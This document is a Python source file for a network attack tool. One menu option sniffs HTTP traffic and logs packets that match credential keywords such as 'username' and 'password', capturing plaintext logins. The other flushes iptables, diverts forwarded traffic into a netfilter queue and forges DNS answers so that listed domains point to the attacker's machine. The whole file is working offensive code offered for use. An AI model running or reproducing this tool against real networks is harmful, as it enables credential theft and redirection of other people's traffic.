#!/usr/bin/python
import scapy.all as scapy
import os
import re
import sys
import socket
import terminal_banner
from time import sleep
from scapy_http import http
from datetime import datetime
from colorama import Fore, Back, Style
from netfilterqueue import NetfilterQueue

colors = {
    'HEADER': "\033[95m",
    'OKBLUE': "\033[94m",
    'RED': "\033[91m",
    'OKYELLOW': "\033[93m",
    'GREEN': "\033[92m",
    'LIGHTBLUE': "\033[96m",
    'WARNING': "\033[93m",
    'FAIL': "\033[91m",
    'ENDC': "\033[0m",
    'BOLD': "\033[1m",
    'UNDERLINE': "\033[4m",
    'M': '\033[1;35;32m'  # magenta
}
# Packet Sniffing


def FileName():
    return datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')


def Sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=Prosess_sniffed_paceket)


def Geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def Get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "email", "name",
                    "id", "pPASS", "Username", "user_login", "login_username", "log", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load


def Prosess_sniffed_paceket(packet):
    if packet.haslayer(http.HTTPRequest):
        website = Geturl(packet)
        print(Fore.BLUE + "[+] HTTP Request >>" + str(website))
        loginfo = Get_login_info(packet)
        if loginfo:
            file = open('data/log_' + FileName() + '.txt', 'w+')
            file.write(website + "\n\n\t" + loginfo)
            print(
                Fore.RED + "\n\n\t [!] Possible Username/password >> " + loginfo + "\n\n\n")

# DNS SPOOF


def banner():
    print(colors['HEADER'] + "")
    banner_text = "\t\tThis Project is working DNS spoof \n\n \t\t\tAuther : name \n"
    print(terminal_banner.Banner(banner_text))


def FileName():
    return datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')


register = {}


def host_ip():
    return re.search(re.compile(r'(?<=inet )(.*)(?=\/)', re.M), os.popen('ip addr show eth0').read()).groups()[0]


def valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False


def read_file(path):
    if(os.path.isfile(path) and os.stat(path).st_size > 0):
        file = open(path, "r")
        for line in file:
            if(line not in ['\n', '\r\n']):
                try:
                    key, value = line.split()
                    register[key] = value
                except:
                    print(
                        colors['FAIL'] + "Invalid File format <domain> <fake Ip address> " + colors['ENDC'])
                    sys.exit(1)
        file.close()
    else:
        print(colors['FAIL'] + "The file doen't exits " + colors['ENDC'])
        sys.exit(1)


def process_packet(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if(scapy_packet.haslayer(scapy.DNSRR)):
        qname = (scapy_packet[scapy.DNSQR].qname)[0:-1]
        for domain in register:
            if domain in str(qname):
                answer = scapy.DNSRR(rrname=qname, rdata=host_ip())
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
                file = open('data/dns_log_' + FileName() + '.txt', 'w+')
                file.write("["+scapy_packet[scapy.IP].dst+"]" +
                           " " + "["+qname+"]" + " to " + "["+host_ip()+"]")
                print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+scapy_packet[scapy.IP].dst+"]" +
                      colors['WARNING']+": Redirecting "+colors['ENDC']+"["+qname+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+host_ip()+"]")
                pkt.set_payload(str(scapy_packet))
                file.close()
    pkt.accept()


def DnsMain():
    os.system('iptables --flush')
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
    path = raw_input(colors['OKBLUE']+"Enter File path: " + colors['ENDC'])
    read_file(path)
    print(colors['GREEN'] + "\n\t DNS is Start Spoofing "+colors['ENDC'])

    queue = NetfilterQueue()
    queue.bind(1, process_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        print(colors['RED'] + "\n[!] DNS Spoofed is stoped"+colors['ENDC'])


def main():
    banner()
    while True:
        print(colors['GREEN'] + "\n\n\t 1. for Packet Sniffing"+colors['ENDC'])
        sleep(0.1)
        print(colors['OKYELLOW'] + "\t 2. for DNS Spoof "+colors['ENDC'])
        sleep(0.1)
        print(colors['RED'] + "\t 3. for Exit the Program"+colors['ENDC'])
        sleep(0.2)
        choices = int(input(colors['M'] + "Enter you Choices:"+colors['ENDC']))

        if choices == 1:
            Sniff("eth0")
        elif choices == 2:
            DnsMain()
        elif choices == 3:
            exit()


if __name__ == '__main__':
    main()
